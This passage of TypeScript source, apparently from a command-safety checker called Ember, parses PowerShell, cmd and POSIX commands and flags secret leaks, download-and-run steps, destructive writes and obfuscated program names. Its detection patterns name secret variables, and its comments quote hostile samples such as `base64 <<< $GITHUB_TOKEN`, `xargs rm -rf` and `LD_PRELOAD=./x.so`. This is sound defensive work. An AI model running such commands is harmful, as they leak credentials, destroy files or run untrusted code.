            if (commandLineSecret(el.raw) || (value !== "" && commandLineSecret(`${st.assign.replace(/^env:/i, "")}=${value}`))) this.add("secret", "secret.token-arg", SAYS.tokenArg);
            // An environment variable set to a file this task downloaded may name a program a later command runs
            // (`$env:CC = '.\cc.sh'; make`: commands-remote-r9-5).
            if (/^env:/i.test(st.assign) && value !== "" && this.namesDownload(value, sc)) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
          }
          // A value that is a secret environment variable prints it.
          for (const seg of el.segs) if (seg.t === "var" && /^env:/i.test(seg.name) && SECRET_VAR.test(seg.name.slice(4))) this.add("secret", "secret.env", SAYS.env);
          if (/\$(\{)?env:/i.test(el.raw) && /\$\{?env:[A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD|PASSWD|PASS|KEY|CREDENTIAL|AUTH|SESSION|COOKIE|PRIVATE)/i.test(el.raw)) this.add("secret", "secret.env", SAYS.env);
          void savedAt;
          prev = this.at;
          return;
        }
        this.cdTarget = undefined;
        this.psCommand(el, sc, { stdinPipe: k > 0, pipedFrom: k === 0 ? undefined : prev });
        prev = this.at;
        if (st.elements.length === 1 && this.cdTarget !== undefined) {
          // PowerShell 5.1 has no &&: a failed Set-Location doesn't stop what follows, so later statements' folder is unknown.
          sc.cwd = si === sts.length - 1 ? this.cdTarget : this.cdTarget === sc.cwd ? sc.cwd : null;
        }
      });
    });
  }

  private psSub(sts: PsStatement[], sc: Scope): boolean {
    const savedPipe = this.pipe;
    const savedAt = this.at;
    const savedProg = this.program;
    const savedCd = this.cdTarget;
    const before = this.commands.length;
    this.psStatements(sts, child(sc, { depth: sc.depth + 1 }));
    const fetch = this.commands.slice(before).some(c => FETCHERS.has(c.program.toLowerCase()));
    this.pipe = savedPipe;
    this.at = savedAt;
    this.program = savedProg;
    this.cdTarget = savedCd;
    return fetch;
  }

  /**
   * The value a PowerShell assignment gives its variable, for Ember's own refusal (commands-remote-c3-2): a plain value
   * (`"$env:LOCALAPPDATA\ember"`) or `Join-Path` of plain values; null for anything else (a command's output).
   */
  private psAssigned(st: PsStatement, sc: Scope): Arg | null {
    if (st.elements.length !== 1) return null;
    const el = st.elements[0];
    if (el.kind === "expr") return el.subs.length ? null : this.psValue(el.segs, el.raw, sc, true);
    if (el.name.segs.length !== 1 || el.name.segs[0].t !== "lit" || el.name.segs[0].s.toLowerCase() !== "join-path") return null;
    const parts: Arg[] = [];
    let named: string | null = null;
    for (const a of el.args) {
      if (a.kind === "param") { named = a.param?.toLowerCase() ?? null; if (a.attached) { parts.push(this.psValue(a.segs, a.raw, sc, a.quoted)); named = null; } continue; }
      if (a.kind !== "word" || (named !== null && !/^(path|childpath|additionalchildpath)$/.test(named))) return null;
      parts.push(this.psValue(a.segs, a.raw, sc, a.quoted));
      named = null;
    }
    if (parts.length < 2) return null;
    if (parts.every(x => x.v !== null)) return lit(win32.join(...parts.map(x => x.v!)));
    // A part Ember can't see: what is joined so far, then that part, for the refusal.
    const pieces: (string | { name: string | null })[] = [];
    parts.forEach((x, k) => { if (k > 0) pieces.push("\\"); if (x.v !== null) pieces.push(x.v); else pieces.push(...(x.parts ?? [{ name: null }])); });
    return { v: null, raw: el.name.raw, glob: false, parts: pieces };
  }

  /** A PowerShell value's parts resolved: $HOME, $PWD, $env:USERPROFILE and the profile folders, $PROFILE, $null. */
  psValue(segs: PsSeg[], raw: string, sc: Scope, quoted: boolean): Arg {
    let v = "";
    let unresolved = false;
    const w = sc.windows;
    // What stands in it, a variable's name for a part Ember can't resolve: for Ember's own refusal (commands-remote-c3-2).
    const parts: (string | { name: string | null })[] = [];
    for (const seg of segs) {
      if (seg.t === "lit") { v += seg.s; parts.push(seg.s); continue; }
      if (seg.t === "unres") { unresolved = true; parts.push({ name: null }); continue; }
      const n = seg.name.toLowerCase();
      const known: Record<string, string | null | undefined> = {
        home: sc.home, pwd: sc.cwd, "env:userprofile": w?.home ?? sc.home, "env:temp": w?.temp, "env:tmp": w?.temp,
        "env:localappdata": w?.localAppData, "env:appdata": w?.appData, "env:systemroot": w?.systemRoot, "env:windir": w?.systemRoot,
        null: "$null", true: "True", false: "False",
      };
      if (n === "profile" || n.startsWith("profile.")) {
        const home = w?.home ?? sc.home;
        if (home) { const pf = `${home}\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1`; v += pf; parts.push(pf); continue; }
      }
      const val = known[n];
      if (val === undefined || val === null) { unresolved = true; parts.push({ name: n.replace(/^(script|global|local|private|using):/, "") }); }
      else { v += val; parts.push(val); }
    }
    void quoted;
    return { v: unresolved ? null : v, raw, glob: !unresolved && /[*?[]/.test(v), ...(unresolved ? { parts } : {}) };
  }

  /** A PowerShell argument as one or more values (an array gives one per element). */
  psArgValues(a: PsArg, sc: Scope): Arg[] {
    if (a.items) return a.items.map(segs => this.psValue(segs, a.raw, sc, a.quoted));
    // A value whose only subexpression is a plain `$(Get-Location)` or `$(pwd)` gives the folder, as `$PWD` does (#170).
    const cwdSub = a.subs.length === 1 && a.segs.filter(seg => seg.t === "unres" && seg.why === "subexpression").length === 1 && lonePsLocation(a.subs[0]);
    const segs = cwdSub ? a.segs.map(seg => (seg.t === "unres" && seg.why === "subexpression" ? { t: "var" as const, name: "pwd" } : seg)) : a.segs;
    return [this.psValue(segs, a.raw, sc, a.quoted)];
  }

  /** PowerShell redirections in the shared form (`*>` as `&>`; a merge such as `2>&1` writes no file). */
  private psRedirs(list: readonly PsRedir[], sc: Scope): Redir[] {
    return list.map(r => {
      if (r.merge || !r.target) return { op: "2>", target: null, kind: "none" } as Redir;
      const t = this.psValue(r.target.segs, r.target.raw, sc, r.target.quoted);
      const op = r.op === "*>" ? "&>" : r.op === "*>>" ? "&>>" : r.op;
      return { op, target: t, kind: r.op.endsWith(">>") ? "append" : "write" } as Redir;
    });
  }

  private psCommand(cmd: PsCommand, sc: Scope, o: { stdinPipe: boolean; pipedFrom?: number }): void {
    let fetch = false;
    for (const a of [cmd.name, ...cmd.args]) for (const sub of a.subs) if (this.psSub(sub, sc)) fetch = true;
    for (const r of cmd.redirs) for (const sub of r.target?.subs ?? []) this.psSub(sub, sc);
    const name = cmd.name.segs.some(s => s.t !== "lit") ? { v: null, raw: cmd.name.raw, glob: false } as Arg : this.psValue(cmd.name.segs, cmd.name.raw, sc, cmd.name.quoted);
    // Native programs get each element of an array as an argument of its own; parameters as written.
    const words: Arg[] = [name];
    for (const a of cmd.args) {
      if (a.kind === "param") {
        if (a.attached && a.param) {
          // `-p:value` reaches a program as one argument, as written (a cmdlet binds it from the parsed command).
          const vals = this.psArgValues(a, sc);
          const one = vals.length === 1 ? vals[0].v : null;
          words.push({ v: one === null ? null : `-${a.param}:${one}`, raw: a.raw, glob: false, param: a.param });
          continue;
        }
        words.push(a.param ? { v: `-${a.param}`, raw: a.raw, glob: false, param: a.param } : { v: "--", raw: a.raw, glob: false });
      } else if (a.kind === "block") {
        words.push({ v: null, raw: a.raw, glob: false });
      } else {
        const vals = this.psArgValues(a, sc);
        for (const v of vals) { if (fetch) v.fetch = true; words.push(v); }
      }
    }
    const redirs = this.psRedirs(cmd.redirs, sc);
    this.simple({ words, redirs, stdin: o.stdinPipe ? "pipe" : null, fetchBefore: this.pipe.fetch, background: cmd.background, pipedFrom: o.pipedFrom, ps: cmd }, sc);
  }

  // ----------------------------------------------------------------------------------------------------------------
  // cmd.

  private cmdLine(p: ReturnType<typeof lexCmd>, sc: Scope): void {
    let from = sc.cwd;
    p.pipes.forEach((pipe, k) => {
      this.pipe = { fetch: false, program: "" };
      let prev: number | undefined;
      pipe.cmds.forEach((c, j) => {
        this.cdTarget = undefined;
        this.cmdSimple(c, sc, { stdinPipe: j > 0, pipedFrom: j === 0 ? undefined : prev });
        prev = this.at;
        if (pipe.cmds.length === 1 && this.cdTarget !== undefined) {
          const next = p.ops[k];
          sc.cwd = next === "&&" ? this.cdTarget : this.cdTarget === sc.cwd ? sc.cwd : null;
        }
      });
      if (p.ops[k] !== "&&") from = this.chainEnds(from, sc);
    });
  }

  cmdWord(w: CWord, sc: Scope): Arg {
    let v = "";
    let unresolved = false;
    const win = sc.windows;
    for (const seg of w.segs) {
      if (seg.t === "lit") { v += seg.s; continue; }
      if (seg.t === "unres") { unresolved = true; continue; }
      const n = seg.name.toLowerCase();
      const known: Record<string, string | null | undefined> = {
        userprofile: win?.home ?? sc.home, temp: win?.temp, tmp: win?.temp, localappdata: win?.localAppData, appdata: win?.appData,
        systemroot: win?.systemRoot, windir: win?.systemRoot, cd: sc.cwd,
        systemdrive: drive(win?.systemRoot), homedrive: drive(win?.home ?? sc.home), programdata: win ? `${drive(win.systemRoot)}\\ProgramData` : undefined,
        programfiles: win ? `${drive(win.systemRoot)}\\Program Files` : undefined,
      };
      const val = known[n];
      if (val === undefined || val === null) unresolved = true;
      else v += val;
    }
    return { v: unresolved ? null : v, raw: w.raw, glob: !unresolved && /[*?]/.test(v) };
  }

  private cmdSimple(c: CSimple, sc: Scope, o: { stdinPipe: boolean; pipedFrom?: number }): void {
    const words = c.words.map(w => this.cmdWord(w, sc));
    const redirs: Redir[] = c.redirs.map(r => {
      if (r.dup || !r.target) return { op: "2>", target: null, kind: "none" } as Redir;
      const t = this.cmdWord(r.target, sc);
      const err = r.fd === 2;
      if (r.op === "<") return { op: "<", target: t, kind: "read" } as Redir;
      if (r.op === ">>") return { op: err ? "2>>" : ">>", target: t, kind: "append" } as Redir;
      return { op: err ? "2>" : ">", target: t, kind: "write" } as Redir;
    });
    // A leading @ only hides the echo.
    if (words[0]?.v?.startsWith("@")) words[0] = { ...words[0], v: words[0].v.slice(1) };
    // A program word spelled with carets (`^d^e^l`) hides what it runs (§3.4.3).
    const caret = c.words[0] !== undefined && c.words[0].raw.includes("^");
    if (words.length === 0) {
      this.newCommand("", [], sc, redirs, false, o.pipedFrom);
      this.redirects(redirs, sc);
      return;
    }
    this.simple({ words, redirs, stdin: o.stdinPipe ? "pipe" : c.redirs.some(r => r.op === "<") ? "file" : null, fetchBefore: this.pipe.fetch, background: false, pipedFrom: o.pipedFrom }, sc);
    if (caret) this.unclear("unclear.cmd-caret", "It hides the program's name with ^ characters, so Ember can't tell what runs.");
  }

  // ----------------------------------------------------------------------------------------------------------------
  // One simple command, any family.

  /** Redirections (§3.4.6). */
  redirects(redirs: Redir[], sc: Scope): void {
    for (const r of redirs) {
      if (r.kind === "none") continue;
      const t = r.target;
      if (!t) continue;
      if (t.v !== null && NULL_SINKS.has(t.v.toLowerCase()) || (t.v !== null && /^\/dev\/fd\/\d+$/.test(t.v))) continue;
      if (r.kind === "read") { this.usePath(t, "read", sc); continue; }
      if (t.v === null) { this.judgeUnseen(t, r.kind === "append" ? "append" : "write", sc); this.add("destroy", r.kind === "append" ? "redirect.append" : "redirect.overwrite", "Writes to a file Ember can't name."); continue; }
      if (r.kind === "write") {
        const obj = this.usePath(t, "write", sc);
        if (obj.abs === null) { this.add("destroy", "redirect.overwrite", "Writes to a file Ember can't name."); continue; }
        if (obj.kind === "glob") { this.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj] }); continue; }
        this.add("destroy", "redirect.overwrite", `Overwrites ${obj.text} if it exists.`, { objects: [obj], ifExists: obj.abs });
        continue;
      }
      this.append(t, sc, "redirect.append");
    }
  }

  /** An append (`>>`, `tee -a`, Add-Content): ordinary inside the work tree; start-up files are system (§3.4.6). */
  append(t: Arg, sc: Scope, rule: string): void {
    const obj = this.usePath(t, "append", sc);
    if (obj.abs === null) { this.add("destroy", rule, "Writes to a file Ember can't name."); return; }
    const k = writeKind(obj.abs, sc.path);
    if (k === "startup" || k === "hook" || k === "git-config" || k === "wsl-config" || k === "autostart" || k === "bin" || k === "program-config") return;
    if (!inWorkTree(obj.abs, sc.path) || homeDotFile(obj.abs, sc.path)) {
      this.add("destroy", rule, `Adds to ${obj.text}, outside your project.`, { objects: [obj] });
    }
  }

  /**
   * Judges one simple command: its redirections, its program word, then the program's row. `before` runs once the
   * command is registered (assignments in front of it).
   */
  simple(s: Simple, sc: Scope, before?: () => void): void {
    const nameArg = s.words[0];
    const args = s.words.slice(1);
    if (nameArg.v === null) {
      this.newCommand(nameArg.raw, args, sc, s.redirs, s.background, s.pipedFrom);
      before?.();
      this.unclear("unclear.program", "It runs a program Ember can't name.");
      // `"$d/bin/ember"`: run from Ember's own folder through a variable, refused as by its name (commands-remote-v5-2).
      this.judgeUnseen(nameArg, "exec", sc, false);
      if (nameArg.fetch) this.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
      this.redirects(s.redirs, sc);
      this.readArgs(args, sc);
      this.afterArgs(args);
      return;
    }
    const pn = programName(nameArg.v, { os: sc.os, family: sc.family, wsl: sc.wsl, mountRoot: sc.mountRoot });
    let key = pn.key;
    let prog = pn.isPath ? pn.base : nameArg.v;
    if (sc.family === "powershell" && !pn.isPath && pn.ext === "") {
      const alias = PS_ALIASES[key.toLowerCase()];
      if (alias) { prog = alias; key = alias.toLowerCase(); }
      else if (/^[a-z]+-[a-z0-9]+$/i.test(nameArg.v)) { prog = nameArg.v; key = nameArg.v.toLowerCase(); }
    }
    this.newCommand(prog, args, sc, s.redirs, s.background, s.pipedFrom);
    if (s.stdin === "file" || s.stdin === "heredoc") this.stdinGiven.add(this.at);
    if (s.stdin === "heredoc") this.hereAt.set(this.at, s.stdinText ?? null);
    // Text on stdin that uses a variable (`xargs rm -rf <<< "$d"`) is a use Ember doesn't judge as a path, unless a read
    // or mapfile takes a here-string's word as its value, a loop's closer hands it to the reads in the loop (feedReads),
    // the program reads no stdin (commands-remote-v5-2), or it only reads text and nothing takes what it prints
    // (`grep -q x <<< "$d"`: commands-remote-w5-4). A program Ember can't follow may change what the value names; xargs
    // and parallel hand it to the command they run, which judges it as it uses it (commands-remote-w5-5).
    const takes = key === "read" || key === "mapfile" || key === "readarray";
    if (s.stdinVars && (key === "done" || key === "fi")) this.hereVarsAt.set(this.at, s.stdinVars);
    if (key === "done" || key === "fi") this.closerInput.set(this.at, s.ownInput);
    else if (s.stdinVars && !(takes ? s.stdinVars.word !== null : VAR_SHOWN_ONLY.has(key) || (readsText(key, args) && !s.pipedOn))) this.useUnjudged(s.stdinVars.names, key !== "xargs" && key !== "parallel");
    // A secret-named variable in that text is handed to the program as one on its line is (commands-classes-y9-3):
    // `base64 <<< $GITHUB_TOKEN` prints it in a form no redaction knows.
    if (s.stdinVars && !takes && s.stdinVars.names.some(n => SECRET_VAR.test(n) && !this.loopVars.has(n) && !this.varValues.has(n))) this.add("secret", "secret.env", SAYS.env);
    this.noteProgram(prog);
    before?.();
    if (nonAsciiLetters(nameArg.v)) this.unclear("unclear.program-letters", "Its program name has letters from another alphabet.");
    // A program name with a line break, a tab or another control character in it names no program Ember can look up.
    // eslint-disable-next-line no-control-regex -- control characters are exactly what is looked for here
    if (/[\x00-\x1f\x7f]/.test(nameArg.v)) this.unclear("unclear.program", "It runs a program Ember can't name.");
    this.redirects(s.redirs, sc);
    if (s.background) this.add("escape", "escape.background", SAYS.keepsRunning);
    const inner = this.commands.length;
    const dlBefore = this.downloads.length;
    this.dispatch({ e: this, sc, s, key, prog, nameArg, args, pn });
    // A wrapper's own words (`sudo -D "$d" ls`, `xargs -a "$d/x" echo`; commands-remote-v5-2): the command it runs
    // (`do echo "$f"`, `sudo rm "$d"`) noted its words itself.
    // Where what it prints goes: the terminal, the next command as its input, or on to a file, a substitution or a
    // command that isn't handed it (commands-remote-c5-1).
    const toFile = s.redirs.some(r => (r.kind === "write" || r.kind === "append") && !r.op.startsWith("2") && !(r.target?.v != null && NULL_SINKS.has(r.target.v.toLowerCase())));
    // Only the shell's own echo and printf hand their words on as the next command's input (printedBy): a program
    // merely named so (`./echo "$d" | xargs rm -rf`) prints what it likes, so its variables are judged here
    // (commands-remote-c7-2).
    const handsOn = s.carriedOn === true && !(sc.family === "posix" && (key === "echo" || key === "printf") && nameArg.v !== key);
    const out = toFile || (s.pipedOn === true && !handsOn) ? "onward" : handsOn ? "carried" : "shown";
    // Its written-out words too, which the next command may get as names: judged for Ember's own refusal.
    if (s.carriedOn === true && !handsOn) this.judgeInput(args.map(a => a.v ?? "").join("\n"), sc);
    this.noteVarUses(key, this.commands.length === inner ? args : args.filter(a => !this.payloadWords.has(a)), out);
    if ((key === "done" || key === "fi" || key === "esac") && out !== "shown") this.compoundOnward = true;
    this.unnamedWrites(key, args, sc);
    this.afterArgs(args, key);
    this.afterRun(key, args, s, sc, sc, dlBefore);
    this.hiddenNames(key, args, sc);
    this.pipe.program = key;
    if (fetches(key) || DECODERS.has(key)) this.pipe.fetch = true;
  }

  /** The program's row, after the checks every program gets. */
  dispatch(h: H): void {
    const { sc, key, nameArg, args, pn } = h;
    if (pn.isPath) {
      this.usePath(nameArg, "exec", sc);
      // A download run by its path, and told to detach by its own words (`./i.sh --daemon`: integ-y-5).
      if (this.isDownloaded(nameArg, sc)) { this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded); detachWords(h, args); }
      if (!this.onRecord(nameArg, sc)) this.scriptByPath(nameArg, pn, sc);
      scriptName(h, nameArg.v ?? "");
      if (!NATIVE[key] && nameArg.v !== null) scriptVerbs(h, nameArg.v, args);
    } else if (sc.wrappers.length > 0 && nameArg.v !== null && this.holdsAnyDownload() && this.isDownloaded(nameArg, sc, false)) {
      // A command handed to a program by a bare word that is a download of this task (`mytool r`, where generic()
      // took `r` for a program's name): it may be what runs (commands-remote-r9-5).
      this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    } else if (sc.family === "cmd" && nameArg.v !== null && !CMD_BUILTINS[key]) {
      // cmd looks in the current folder first, with each runnable extension when none is written.
      const names = pn.ext ? [nameArg.v] : [nameArg.v, ...[".exe", ".com", ".bat", ".cmd"].map(e => nameArg.v + e)];
      if (names.some(n => this.isDownloaded(lit(n), sc))) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
    }
    // cmd runs `x` or `.\x` as x.bat or x.cmd from the current folder when one is there: read them first (L8).
    if (sc.family === "cmd" && pn.ext === "" && nameArg.v !== null && !CMD_BUILTINS[key] && !nameArg.glob && !this.onRecord(nameArg, sc)) {
      for (const e of [".bat", ".cmd"]) this.recordScript(lit(nameArg.v + e), "cmd", sc, true);
    }
    if (pn.interop) {
      this.windowsReach = true;
      if (args.some(a => a.v !== null && (a.v.includes("\t") || a.v.includes("\"") || (a.v.endsWith("\\") && a.v.length > 1)))) {
        this.unclear("unclear.interop-args", "Windows would get different arguments than this shows.");
      }
    }
    if (pn.ext === ".bat" || pn.ext === ".cmd") {
      // A batch file runs under cmd, which re-reads its arguments (critique wsl-3).
      if (!pn.isPath) scriptName(h, nameArg.v ?? "");
      if (!this.onRecord(nameArg, sc)) this.recordScript(nameArg, "cmd", sc);
      if (args.some(a => a.v === null || /[&|<>^%!]/.test(a.v))) this.unclear("unclear.batch-args", "cmd would read its arguments as commands.");
      if (sc.wsl && sc.family === "posix" && !(sc.cwd && sc.mountRoot && isUnder(sc.cwd, sc.mountRoot, sc.path))) {
        this.unclear("unclear.cmd-linux-folder", SAYS.cmdLinuxFolder);
      }
      // The project's own copy of a launcher, by its Windows shim (`node_modules\.bin\cross-env.cmd`: integ2-z-3).
      if (ENV_LAUNCHERS.has(key) && !this.asMain) { unknownProgram(h); launcherSets(h); }
      // A command handed to the batch file is read as one, as for any script (commands-classes-x9-4).
      if (nameArg.v !== null) handedCommand(h, -1, { name: nameArg.v, args });
      this.readArgs(args, sc);
      return;
    }
    if (sc.family === "powershell") {
      // PowerShell's function:, alias: and variable: drives: writing one changes what a name runs.
      if (/^(new|set|add|rename|copy|move|remove|clear)-/.test(key) && args.some(a => /^(function|alias|variable):/i.test(a.v ?? ""))) {
        this.unclear("unclear.alias", "It changes what a name runs.");
      }
      if (/^(new|set|add|rename|copy|move|remove|clear)-/.test(key) && args.some(a => /^env:/i.test(a.v ?? ""))) this.envChanged = true;
      const ps = CMDLETS[key];
      if (ps) { ps(h); return; }
      if (/^[a-z]+-[a-z0-9]+$/.test(key) && !NATIVE[key]) { unknownCmdlet(h); return; }
    }
    if (sc.family === "cmd") {
      if (key.startsWith(":")) { this.unclear("unclear.cmd-label", SAYS.unclear); return; }
      const b = CMD_BUILTINS[key];
      if (b) { b(h); return; }
    }
    const windowsSide = sc.os === "win32" || sc.family !== "posix" || pn.interop;
    if (windowsSide && (key === "bash" || (!NATIVE[key] && DISTRO_LAUNCHER.test(key)))) { distroLauncher(h); return; }
    // A versioned name of a program with a row is that program (`python3.12 -c …`, `pip3.12`, `node20`): its row
    // decides, never the allow-list's "a program Ember knows" (commands-remote-r9-3).
    // What a program with no row was always asked stays beside it (generic(): `pip3.12 install x` read as a program
    // handed `install`, as on main), so no versioned name decides less safely than it did.
    if (!NATIVE[key] && NATIVE[unversioned(key)]) { this.dispatch({ ...h, key: unversioned(key) }); generic(h, true); return; }
    terminalDriver(h);
    const n = NATIVE[key];
    const from = this.findings.length;
    if (n) { this.runRow(n, h); this.verbGuard(h, from); }
    else { unknownProgram(h); generic(h, true); }
    toolPayload(h);
    // A script a tool runs by its file's name (`tsx tool.ts 'npm publish'`, `bun tool.ts …`): the words after it are
    // the script's own, read as runScript reads an interpreter's (commands-classes-x9-4).
    const files = !n ? (ORDINARY_VERBS[key] ?? ORDINARY_VERBS[unversioned(key)])?.files : key === "bun" ? /\.(m|c)?(j|t)sx?$/i : undefined;
    const script = files ? args.find(a => a.v !== null && !a.v.startsWith("-") && files.test(a.v)) : undefined;
    if (script) handedToScript(h, script);
    // A deleter that had no row before commands-remote-c8-2 keeps an unknown program's `-o` (commands-remote-x8-5),
    // and so does toybox (commands-closed-y9-1).
    optionPaths(h, !n || UNKNOWN_OPTIONS.has(key));
  }

  /**
   * A verb-keyed tool's row that found nothing to ask about (since `from`, standing whatever the target's files are)
   * for a verb that isn't among the ones Ember knows it to have (ORDINARY_VERBS): it asks (commands-closed).
   */
  verbGuard(h: H, from: number): void {
    if (this.asMain || this.refuse) return;
    const tool = ORDINARY_VERBS[h.key] ?? ORDINARY_VERBS[unversioned(h.key)];
    if (!tool || this.findings.slice(from).some(f => f.ifExists === undefined)) return;
    toolVerbs(h, tool, false);
  }

  /** Every argument read as a possible path (an unknown program's operands): secrets and Ember's paths judged. */
  readArgs(args: Arg[], sc: Scope, o: { unresolvedUnclear?: boolean } = {}): void {
    for (const a of args) {
      if (a.param !== undefined) continue;
      // A processor count, apart or attached to an option (`-j $(nproc)`, `--parallel=$(nproc)`): a number, no file.
      if (a.v === null && (CPU_COUNT_WORD.test(a.raw) || CPU_COUNT_WORD.test(a.raw.replace(/^(--[A-Za-z][A-Za-z0-9-]*=|-[A-Za-z])/, "")))) continue;
      if (a.v === null) {
        this.judgeUnseen(a, "read", sc);
        if (o.unresolvedUnclear) this.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${this.program || "the program"} gets.`);
        continue;
      }
      let v = a.v;
      if (isOption(a)) {
        const eq = v.indexOf("=");
        if (eq < 0) continue;
        v = v.slice(eq + 1);
        if (!/^[~/.]|^[A-Za-z]:[\\/]|[\\/]/.test(v)) continue;
      }
      if (URL_LIKE.test(v)) {
        if (/^file:\/\//i.test(v)) this.usePath({ ...a, v: decodeURIComponent(v.replace(/^file:\/\/(localhost)?/i, "")) }, "read", sc);
        continue;
      }
      if (v.startsWith("ember:")) { this.refuseWith("ember.url", "input"); continue; }
      const obj = this.usePath({ ...a, v }, "read", sc);
      if (obj.abs === null && o.unresolvedUnclear && v !== "") this.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${this.program || "the program"} gets.`);
    }
  }

  /**
   * A variable named for a secret, expanded as a program's argument (modes-y9-6): the program is handed the secret and
   * may print it, whatever program it is, so it is a `secret.env` finding as `echo $TOKEN` is, by the same name test
   * (SECRET_VAR). Never a variable the line itself set or loops over (its value is the line's own text), a
   * single-quoted word, or the shell's own words that only set names.
   */
  private secretVars(args: readonly Arg[], key: string): void {
    if (/^(export|declare|typeset|local|readonly|unset|set|let|read|mapfile|readarray|for|select|case|:)$/.test(key)) return;
    const secret = (n: string): boolean => SECRET_VAR.test(n) && !this.loopVars.has(n) && !this.varValues.has(n);
    for (const a of args) {
      if (a.v !== null) continue;
      // The names the parser found, and those written in the word in a form it keeps whole: `${NAME@Q}`, `${NAME^^}`,
      // `${!NAME}` (commands-classes-x9-9).
      const names = [
        ...(a.parts ?? []).flatMap(p => (typeof p === "string" || p.name === null ? [] : [p.name])),
        ...[...a.raw.replace(/'[^']*'/g, "").matchAll(/\$\{?!?(?:env:)?([A-Za-z_][A-Za-z0-9_]*)|%([A-Za-z_][A-Za-z0-9_]*)%/gi)].map(m => m[1] ?? m[2]),
      ];
      if (names.some(secret)) { this.add("secret", "secret.env", SAYS.env); return; }
    }
  }

  /** Checks every program's arguments get: a password or token typed on the command line (§3.5.4). */
  afterArgs(args: Arg[], key = ""): void {
    this.secretVars(args, key);
    for (let k = 0; k < args.length; k++) {
      const a = args[k];
      if (a.v === null) continue;
      if (commandLineSecret(a.v)) { this.add("secret", "secret.token-arg", SAYS.tokenArg); continue; }
      const m = /^--?(password|passwd|pass|token|secret|api-?key|apikey|access-token|auth-token|otp|client-secret)(=(.*))?$/i.exec(a.v);
      if (m) {
        const value = m[2] !== undefined ? m[3] : args[k + 1]?.v;
        if (value && !value.startsWith("-") && !/^(stdin|-)$/i.test(value)) this.add("secret", "secret.token-arg", SAYS.tokenArg);
      }
    }
  }

  /** Classifies an argument vector as a command of its own (a payload: find -exec, xargs, timeout…). */
  payload(words: Arg[], sc: Scope, wrapper: string, o: Partial<Simple> = {}): void {
    if (words.length === 0) return;
    for (const w of words) this.payloadWords.add(w);
    this.payloadHeads.add(words[0]);
    const savedAt = this.at;
    const savedProg = this.program;
    const savedPipe = this.pipe;
    this.pipe = { fetch: o.fetchBefore ?? false, program: "" };
    this.simple({ words, redirs: [], stdin: o.stdin ?? null, fetchBefore: o.fetchBefore ?? false, background: false }, child(sc, { wrappers: [...sc.wrappers, wrapper], depth: sc.depth + 1 }));
    this.innerMarks = this.downloads.length;
    this.pipe = savedPipe;
    this.at = savedAt;
    this.program = savedProg;
  }

  /** Unwraps a wrapper: the same command now runs `words`, with the wrapper recorded (sudo rm → program rm, wrappers sudo). */
  unwrap(h: H, all: Arg[], wrapper: string, o: Partial<Scope> = {}): void {
    if (all.length === 0) return;
    for (const w of all) this.payloadWords.add(w);
    // After a reserved word the shell still takes `NAME=value` words as assignments: `then LD_PRELOAD=./x.so ls` runs ls
    // with the library loaded, and `do PATH=/tmp/x:/usr/bin` changes where later commands are found. They are judged as
    // at the start of a command, never as the program (commands-remote-c1-1).
    let lead = 0;
    if (h.sc.family === "posix" && ASSIGNS_AFTER.has(wrapper)) while (lead < all.length && ASSIGNMENT_WORD.test(all[lead].raw)) lead++;
    this.payloadHeads.add(all[Math.min(lead, all.length - 1)]);
    // Before these were read as assignments the first one stood as a program Ember didn't know, and with a word after
    // it that names a program that runs others (`time x=1 sh -c '…'`, `if IFS= read -r l <<< 'a'`) it asked how the one
    // runs the other (generic()). Such a command still asks, after a flow word as after `time` (commands-remote-x7-5).
    const askedAsProgram = lead > 0 && all.slice(1).some(a => {
      const base = (a.v ?? "").split(/[\\/]/).pop() ?? "";
      return a.v !== null && /^[A-Za-z]/.test(base) && runners().has(base.toLowerCase().replace(/\.(exe|com)$/, ""));
    });
    const from = this.findings.length;
    this.unwrapped(h, all, lead, wrapper, o);
    if (askedAsProgram) this.asksAtLeast(from, "unclear.assignment-program", "It sets a variable where a command could stand.");
  }

  /** unwrap's work: the first `lead` words are assignments, the rest the command. */
  private unwrapped(h: H, all: Arg[], lead: number, wrapper: string, o: Partial<Scope>): void {
    const pc = this.commands[this.at];
    const assigns = all.slice(0, lead).map(a => {
      const eq = a.raw.indexOf("=");
      const value: Arg = { v: a.v === null ? null : a.v.slice(a.v.indexOf("=") + 1), raw: a.raw.slice(eq + 1), glob: false };
      return { name: a.raw.slice(0, eq).replace(/\+$/, ""), value };
    });
    const words = all.slice(lead);
    // One whose value Ember can't see (`time x=$(…)`) stood as a program it couldn't name before these were read as
    // assignments, and asked: it still asks (commands-remote-r7-2).
    if (all.slice(0, lead).some(a => a.v === null)) this.unclear("unclear.assignment-unseen", "It sets a variable to text Ember can't see, where a command could stand.");
    // And one whose text a fetch gave (`time x=$(curl …)`) was a program downloaded and run there: that danger stays on
    // the card, for a mode that asks by class (commands-held-7).
    if (all.slice(0, lead).some(a => a.v === null && a.fetch)) this.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    const sc = child(h.sc, { ...o, wrappers: [...h.sc.wrappers, wrapper] }, more(h.sc));
    pc.wrappers = [...sc.wrappers];
    if (words.length === 0) {
      pc.program = "";
      pc.args = [];
      this.program = "";
      this.assignments(assigns, sc);
      return;
    }
    const nameArg = words[0];
    if (nameArg.v === null) {
      pc.program = nameArg.raw;
      pc.args = words.slice(1).map(a => a.v);
      this.program = nameArg.raw;
      this.assignments(assigns, sc, null, true);
      this.unclear("unclear.program", "It runs a program Ember can't name.");
      this.judgeUnseen(nameArg, "exec", sc, false);
      if (nameArg.fetch) this.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
      this.readArgs(words.slice(1), sc);
      return;
    }
    const pn = programName(nameArg.v, { os: sc.os, family: sc.family === "cmd" ? "posix" : sc.family, wsl: sc.wsl, mountRoot: sc.mountRoot });
    let key = pn.key;
    let prog = pn.isPath ? pn.base : nameArg.v;
    if (sc.family === "powershell" && !pn.isPath && pn.ext === "") {
      const alias = PS_ALIASES[key.toLowerCase()];
      if (alias) { prog = alias; key = alias.toLowerCase(); }
    }
    pc.program = prog;
    pc.args = words.slice(1).map(a => a.v);
    this.program = prog;
